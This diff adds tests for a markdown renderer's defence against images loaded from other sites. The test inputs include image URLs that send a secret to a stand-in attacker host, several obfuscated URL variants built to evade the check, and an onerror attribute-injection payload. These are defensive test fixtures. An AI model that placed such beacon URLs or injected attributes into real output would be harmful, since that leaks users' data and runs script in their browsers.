@@ -4,6 +4,8 @@ import {
   createRenderer,
   extractSections,
   headingSlug,
+  isOwnImageSrc,
+  linkOutsideImages,
   locateQuote,
   noteSegments,
   sourceBlocks,
@@ -1024,4 +1026,42 @@ test("an unresolvable [[id:…]] in a note is still a segment, not swallowed", (
     { text: "the missing page", href: "/id:ghost" },
     { text: "." },
   ]);
+});
+
+test("isOwnImageSrc: Crescent's own paths and data images, never another site", () => {
+  for (const src of ["/kb25/_assets/plot.png", "_assets/plot.png", "plot.png", "./a/b.png", "data:image/png;base64,iVBORw0KGgo="]) {
+    assert.equal(isOwnImageSrc(src), true, src);
+  }
+  // A browser reads every one of these as another site.
+  for (const src of [
+    "https://attacker.example/p.png?d=secret",
+    "HTTP://attacker.example/p.png",
+    "//attacker.example/p.png",
+    "\\\\attacker.example/p.png",
+    "/\\attacker.example/p.png",
+    "ht\ttps://attacker.example/p.png",
+    "ftp://attacker.example/p.png",
+  ]) {
+    assert.equal(isOwnImageSrc(src), false, src);
+  }
+});
+
+test("linkOutsideImages: an image from another site becomes a link, Crescent's own still shows", () => {
+  const md = linkOutsideImages(createRenderer(() => undefined, ""));
+  const html = md.render(
+    "Done. ![status](https://attacker.example/p.png?d=SECRET) ![plot](/kb25/_assets/plot.png) ![](//attacker.example/q.png)"
+  );
+  assert.doesNotMatch(html, /<img[^>]*attacker\.example/);
+  assert.match(html, /<a class="outside-image" href="https:\/\/attacker\.example\/p\.png\?d=SECRET">status<\/a>/);
+  // With no alt text, the address itself is the link's text.
+  assert.match(html, /<a class="outside-image" href="\/\/attacker\.example\/q\.png">\/\/attacker\.example\/q\.png<\/a>/);
+  assert.match(html, /<img src="\/kb25\/_assets\/plot\.png" alt="plot">/);
+});
+
+test("linkOutsideImages: the link's text and address are escaped", () => {
+  const md = linkOutsideImages(createRenderer(() => undefined, ""));
+  const html = md.render('![a "quote" <b>](https://x.example/"onerror=alert(1)//)');
+  assert.doesNotMatch(html, /<img/);
+  assert.doesNotMatch(html, /<b>/);
+  assert.doesNotMatch(html, /" ?onerror=/);
 });
